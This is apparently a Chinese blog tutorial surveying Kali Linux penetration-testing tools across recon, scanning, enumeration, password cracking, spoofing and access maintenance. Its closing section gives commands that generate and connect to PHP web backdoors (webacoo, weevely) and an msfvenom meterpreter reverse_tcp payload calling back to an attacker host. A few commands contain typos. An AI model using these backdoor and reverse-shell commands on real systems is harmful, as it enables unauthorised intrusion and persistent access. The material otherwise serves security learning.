categories: [渗透测试常用工具]
## Kali Linux入门与介绍
#### 一、kali的主要特色
 kali 官网 ：[https://www.kali.org/](https://www.kali.org/)
   基于Debian的Linux发行版

   集成300多个渗透测试程序

   支持绝大多数无线网卡
####  二、网络服务配置

##### 1. 设置固定ip：

虚拟机的网络设置文件



```
/etc/network/interfaces
```


![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407171844465.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NjI2MDQz,size_16,color_FFFFFF,t_70#pic_center =x)
##### 2. 临时ip配置命令


```bash
ifconfig eth0 192.168.43.100 netmask 255.255.255.0					//ip
route add default gw 192.168.43.1									//网关路由
systemctl restart networking.service								//重启网络恢复
```


##### 3. dmesg命令的作用：

查看无线网卡硬件信息，查看内核环形缓冲区信息
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407173342898.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NjI2MDQz,size_16,color_FFFFFF,t_70#pic_center =x)
##### 4. 开启和关闭网络的命令
这里使用systemctl 或者 service 命令均可，语法基本相同，老版本的kali可能只支持service命令
常用的语法有：


```bash
start			//开启
stop			//关闭
restart			//重启
```

##### 5. kali中常用服务

**http(apache)**

service apache2 start                //启动
service apache2 stop                 //关闭
service apache2 restart              //重启
update-rc.d apache2 defaults         //自启

**mysql**

service mysql start                  //启动
service mysql stop                   //关闭
service mysql restart                //重启
update-rc.d mysql defaults           //自启
mysql -u root -p                     //登录

**ssh**

service ssh start                     //启动 
service ssh stop                      //关闭
service ssh restart                   //重启
update-rc.d ssh defaults              //自启

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407173837503.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NjI2MDQz,size_16,color_FFFFFF,t_70#pic_center =x)

####  三、系统更新
##### 命令


```bash
apt-get update
apt-get upgrate
apt-get dist-upgrade
```

**PS:最新版的kali也就是2020年版兼容性并不好，而且移除了许多我常用的工具，个人不推荐更新，有需求除外。**


```bash
aptcache search <包名>			//在软件仓库查找某个软件包的名称
apt-get install <包名>			//指定安装某个软件
```

## 渗透测试概述
#### 一、五个测试框架的方法论
    开源安全测试方法论

    信息系统安全评估框架

    开放式web应用安全项目

    web应用安全联合威胁人类

    渗透测试执行标准

#### 二、通用渗透测试框架
    范围界定

    信息收集

    目标识别

    服务枚举

    漏洞映射

    社会工程学

    漏洞利用

    提升权限

    访问维护

    文档报告
    
    
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407175401330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NjI2MDQz,size_16,color_FFFFFF,t_70#pic_center =x)


## 渗透测试实施步骤
#### 一、信息搜集
##### whois命令的定义、使用和用法
whois example.com
该命令会返回example.com域名注册人信息和联系方式等域名的详细信息。
官网：[https://who.is/](https://who.is/)


![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407181024429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NjI2MDQz,size_16,color_FFFFFF,t_70#pic_center =x)

##### DNS 记录分析
#####  1. host

```bash
host www.example.com
```


无参数时只返回ip地址（ipv4）

```bash
host -a www.example.com
```

加入参数-a ，返回所有dns记录

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407181914501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NjI2MDQz,size_16,color_FFFFFF,t_70#pic_center =x)
#####   2. dig

```bash
dig example.com
```

无参数时只返回A记录地址（IPV4）

```bash
dig example.com any
```

加入参数any，返回所有dns记录


![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407182214675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NjI2MDQz,size_16,color_FFFFFF,t_70#pic_center =x)
#####   3. dnsenum

```bash
dnsenum example.com
```

默认情况下，会返回主机地址、名称解析服务器和邮件服务器的IP地址信息
如果你有字典，可以用此工具爆破子域名
dnsenum -f dns.txt example.com

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407182348140.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NjI2MDQz,size_16,color_FFFFFF,t_70#pic_center =x)

#####   4. dmitry

```bash
dmitry -iwnse targethost
```

   进行whois查询

   在Netcraft.com的网站上挖掘主机信息

   搜索所有可能的子域

   搜索所有可能的电子邮件地址
   


![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407184057649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NjI2MDQz,size_16,color_FFFFFF,t_70#pic_center =x)
```bash
dmitry targethost -f -b
```

做简单的端口扫描(很慢，而且不怎么好用，不推荐）

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407184459297.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NjI2MDQz,size_16,color_FFFFFF,t_70#pic_center =x)

##### 路由信息
#####  1. tcptraceroute

```bash
tcptraceroute example.com
```
在已知目标web服务器开放了使用TCP协议的80端口。使用上述命令可以获取从本机到目标主机完整的路由信息。 

   ps：容易被防火墙拦截

#####  2. tctrace

```bash
tctrace -i eth0 -d example.com
```

指定网卡eth0获取本机和example.com之间的路由信息
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407185412344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NjI2MDQz,size_16,color_FFFFFF,t_70#pic_center =x)

## 目标识别

### 博客分栏 [渗透测试常用工具-目标识别](https://blog.csdn.net/qq_38626043/article/details/104374362)
	
##### 1. ping

```bash
ping -c 10 example.com
ping -c 10 192.168.123.256
```
-c参数指定发送数据包的数量（执行次数）

-i 参数指定源地址或网络接口（网卡）

-s 指定数据包大小（默认大小64字节）
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407190335439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NjI2MDQz,size_16,color_FFFFFF,t_70#pic_center =x)

##### 2. arping
 

```bash
arping 192.168.56.102 -c 1
```
查看局域网内主机是否在线，-i参数指定网卡，-c参数指定次数

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407190506386.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NjI2MDQz,size_16,color_FFFFFF,t_70#pic_center =x)

##### 3. fping

```bash
fping 192.168.1.1 192.168.1.100 192.168.1.107
```

检测这三台主机是否在线

```bash
fping -g 192.168.56.0/24
```

检测整个网段

```bash
fping -r 1 -g 192.168.1.1 192.168.1.10
```

参数-r指定重试次数，默认为3

```bash
fping -s www.baidu.com www.cqcet.edu.cn www.csdn.net
```

-s 参数查看多个目标的统计结果

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407190805710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NjI2MDQz,size_16,color_FFFFFF,t_70#pic_center =x)

##### 4. hping3
主要用途

   测试防火墙规则

   测试入侵检测系统/IDS

   测试TCP/IP模式的安全漏洞

```bash
hping3 -0 192.168.56.101  发送原始IP包（--raw-ip)
hping3 -1 192.168.56.101  发送ICMP包(--icmp)
hping3 -2 192.168.56.101  发送UDP包(--udp)
hping3 -8 192.168.56.101  进入扫描模式(--scan)
hping3 -9 192.168.56.101  进入监听模式(--listen)
```

##### 5. nping

```bash
nping --tcp-connect -c 1 -p 22 192.168.56.102  基础的tcp-connect功能
nping --tcp -c 1 -p 22 192.168.6.102           TCP模式
nping --udp -c 1 -p 22 192.168.6.102           UDP模式
nping --icmp -c 1 -p 22 192.168.6.102          ICMP模式（默认模式）
nping --arp -c 1 -p 22 192.168.6.102           ARP/RARP模式
nping --tr -c 1 -p 22 192.168.6.102            traceroute模式
```

##### 6. nbtscan

```bash
nbtscan 192.168.1.1-254
```

搜索局域网内各个主机的NetBIOS名称

```bash
nbtscan -hv 192.168.1.1-254
```

-hv参数查看运行了那些服务

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407191136834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NjI2MDQz,size_16,color_FFFFFF,t_70#pic_center =x)
##### 7. [uniscan](https://blog.csdn.net/qq_38626043/article/details/104580080)


## 操作系统识别

##### 1. p0f
可以识别以下几种主机

   连接到您主机的机器（SYN模式，即默认模式）

   主机可以访问的机器（SYN+ACK模式）

   主机不能访问的机器（RST+模式）

   可以监控到其网络通信的机器

```bash
p0f -f /etc/p0f/p0f.fp -o p0f.log
```
开放80端口让靶机访问
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407191831998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NjI2MDQz,size_16,color_FFFFFF,t_70#pic_center =x)

##### 2. nmap

```bash
nmap -O 192.168.43.89			//操作系统识别
```

识别率并不是很高
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407192152121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NjI2MDQz,size_16,color_FFFFFF,t_70#pic_center =x)

## 服务枚举
### [渗透测试常用工具-amap服务枚举](https://blog.csdn.net/qq_38626043/article/details/104378461)


#### 网络扫描
##### 1. nmap
主要功能

   主机探测

   端口扫描

   服务/版本检测

   操作系统检测

   网络路由跟踪

   Nmap脚本引擎


```bash
nmap -sT 192.168.43.89							//TCP连接扫描
nmap -sS 192.168.43.89							//SYN扫描
nmap -sN 192.168.43.89 							//TCP NULL扫描
nmap -sF 192.168.43.89  						//TCP FIN扫描
nmap -sX 192.168.43.89  						//TCP XMAS扫描
nmap -sM 192.168.43.89  						//TCP Maimon扫描
nmap -sA 192.168.43.89  						//TCP ACK扫描
nmap -sW 192.168.43.89  						//TCP 窗口扫描
nmap -sI 192.168.43.89  						//TCP Idel扫描 
```

###### 扫描选项

```bash
-p 端口范围 ：只扫描指定的端口
-F （快速扫描）：仅扫描100个常用端口
-r （顺序扫描）：按照从小到大的顺序扫描端口
--top-ports <1 or greater> 扫描nmap-services里排名前N的端口
```

###### 目标端口选项

交互（屏幕）输出
正常输出（-oN）不显示runtime信息和警告信息
XML文件（-oX）生成的XML格式文件可以转换成html文件，也可以被图形用户界面解析，便于导入数据库
生成便于Grep使用的文件（-oG）

###### 输出选项

-T 指定时间排程控制的模式

时间排程控制选项

```bash
nmap -sV 192.168.43.89 -p 22    				//服务版本识别
nmap -O  192.168.43.89          				//操作系统检测
nmap -Pn 192.168.43.89          				//禁用主机检测
nmap -A  192.168.43.89          				//综合扫描
```

###### 常用选项

```bash
-sC 或 --script = default         启动默认类NES脚本
--script <filename>|<category>|<directories>  根据指定的文件名、类别名、目录名，执行相应的脚本
--script-args<args>               给脚本指定参数
```

###### 脚本引擎

```bash
-f 使用小数据包
--mtu 调整数据包的大小
-D    指定假IP
--source-port<portnumber>或-g  模拟源端口
--data-length 改变发送的数据包的默认长度
--max-parallelism  限制nmap并发扫描的最大连接数
--scan-delay<time>  控制发送探测数据的时间间隔
```
edit


##### 2. Unicornscan 
-m U 检测UDP协议
-m T 检测TCP协议

-Iv  查看详细输出

-r  调整发包速率
```bash
unicornscan -m U -Iv 192.168.43.89:1-65535 -r 10000
unicornscan -m T -Iv 192.168.43.89:1-65535 -r 10000
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407194148737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NjI2MDQz,size_16,color_FFFFFF,t_70#pic_center =x)

## SMB枚举
##### 1. nbtscan

```bash
nbtscan 192.168.56.1-254
```

搜索192.168.56.0内各个主机的NetBIOS名称

```bash
nbtscan -hv 192.168.56.102
```

查看192.168.56.102这台主机的网络服务
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407194606410.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NjI2MDQz,size_16,color_FFFFFF,t_70#pic_center =x)
## SNMP枚举
### [渗透测试常用工具-ADMsnmp进行snmp分析](https://blog.csdn.net/qq_38626043/article/details/104379139)

##### 1.     onesixtyone

```bash
onesixtyone 192.168.56.102
```

搜索主机支持的SNMP字符串

```bash
onesixtyone -d 192.168.56.102
```

进行更加细致的扫描

##### 2.     snmpcheck

```bash
snmpcheck -t 192.168.56.102
```

搜集SNMP设备的有关信息


## VPN 枚举

##### 1. ike-scan

```bash
ike-scan -M -A -Pike-hashkey 192.168.0.10
```

探测、识别、测试一台IPSec VPN服务器

   -M 将payload的解码信息分为多行显示，以便于阅读

   -A 使用IKE的aggressive mode

   -P 将aggressive mode的与共享密钥哈希值保存为文件


## 漏洞映射

### 一、漏洞类型

   本地漏洞

   远程漏洞

### 二、漏洞扫描器

  #### OpenVAS

#### Cisco分析工具

   ##### Cisco Auditing Tool（cat）
运行：

```bash
 cd /usr/share/
 CAT --help
```

命令：
-h 指定主机名（在扫描单个主机时使用该选项）
-w 指定字典名称(以猜测团体字符串)
-a 指定密码列表（以穷举密码）
-i 及[ioshist]（检查该IOS在历史上出现过的bug）
    
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407195159592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NjI2MDQz,size_16,color_FFFFFF,t_70#pic_center =x)

##### Cisco Global Exploiter（cge）
运行：

```bash
 cd /usr/bin/
 cge.pl
```
命令
```bash
cge.pl 10.200.213.25 3
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407195537930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NjI2MDQz,size_16,color_FFFFFF,t_70#pic_center =x)

## 第三类测试
[WebCrack](https://blog.csdn.net/qq_38626043/article/details/104585460)
#### FUZZ(模糊)分析工具

  BED（待续）

 JBroFuzz（待续）

### 三、SMB分析工具

##### ImpacketSamrdump
（待续）



### 四、SNMP分析工具

##### SNMP Walk
（待续）

### 五、Web程序分析工具

##### 数据库评估工具
DBPwAudit(待续）


##### [sqlmap](https://blog.csdn.net/qq_38626043/article/details/104754788)
SQL Ninja（待续)

##### Web应用评估工具
Burpsuite (待续）

[nikto](https://blog.csdn.net/qq_38626043/article/details/104580357)

   Paros Proxy（待续）

   W3af（待续）

   WafW00f（待续）
   
   Webscarab（待续）



## 漏洞利用
##### [MSFConsole](https://blog.csdn.net/qq_38626043/article/details/104379662)
##### [MSFConsole_常用模块](https://blog.csdn.net/qq_38626043/article/details/105183361)
##### [MSFConsole_后渗透模块](https://blog.csdn.net/qq_38626043/article/details/104363148)


## 提权
### 一、分类

纵向提权

横向提权

### 二、利用本地漏洞

### 三、密码攻击
 ##### 基于所知

  ##### 基于所有

   ##### 基于特征

   ##### 离线攻击
    
  #####  在线攻击
  hash-idntifire 判断hash算法 --- 只有知道被测系统采用的hash算法，才能使用密码破解

 hashcat 多线程密码破解，完全利用CPU

 RainbowCrack 利用彩虹表破解，空间换取时间

 samdump2 破解windows系统账号的密码

 John 破解hash，破解DES crypt类型优异

 Johnny John的图形化版

 Crunch 创建密码字典，可用于暴力破解

 Ophcrack 基于彩虹表的 LM/NTML类型
 
 ##### 在线破解工具

 CeWL 爬虫模式在指定URL上收集单词的工具，把收集到的单词纳入字典，提高爆破命中率

 Hydra 在线破解密码

 Medusa 在线破解密码

### 四、网络欺骗工具
### [网络嗅探与网络欺骗](https://blog.csdn.net/qq_38626043/article/details/104395687)
 DNSchef

 替DNS服务器对被测主机进行DNS回复，把域名解析为攻击者管控的IP，从而让攻击者的主机扮演真正的服务器的角色

 arpspoof

 在交换网络中辅助进行网络监听的实用工具

 Ettercap

 在LAN中进行中间人攻击的工具

### 五、网络嗅探器

   Dsniff

   tcpdump

   Wireshark


## 访问维护
### 一、操作系统后门
Cymothoa

Intersect

Meterpreter

### 二、隧道工具
##### dns2tcp

##### iodine

##### ncat

##### proxychains

##### ptunnel

##### socat
 
##### sslh

##### stunnel4

### 三、创建web后门
##### WeBaCoo
命令：
-g 制作后门代码
-f 后门所需的php功能：system（默认）/shell_exec/exec/passthru/popen
-o 输出 指定生成的后门程序的文件名
举例：

```bash
webacoo -g -o test.php  使用默认配置生成php后门程序
webacoo -t -u http://192.168.43.89/test.php
```

连接到后门程序
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407205544970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NjI2MDQz,size_16,color_FFFFFF,t_70#pic_center =x)

##### weevely
生成混淆PHP backdoor，并将后门保存为display.php
```bash
weevely generate password display.php
weevely http://192.168.43.89/display.php password
```
访问被测主机的webshell


![在这里插入图片描述](https://img-blog.csdnimg.cn/2020040721001988.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NjI2MDQz,size_16,color_FFFFFF,t_70#pic_center =x)
##### PHP Meterpreter
-p 指定payload为php/meterpreter/reverse_tcp

-f 设置输出格式

lhost 为攻击机地址
lport 为攻击机端口

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.43.180 LPORT=1234 -f raw > a.php
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407215851468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NjI2MDQz,size_16,color_FFFFFF,t_70#pic_center =x)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200407220607645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4NjI2MDQz,size_16,color_FFFFFF,t_70#pic_center =x)



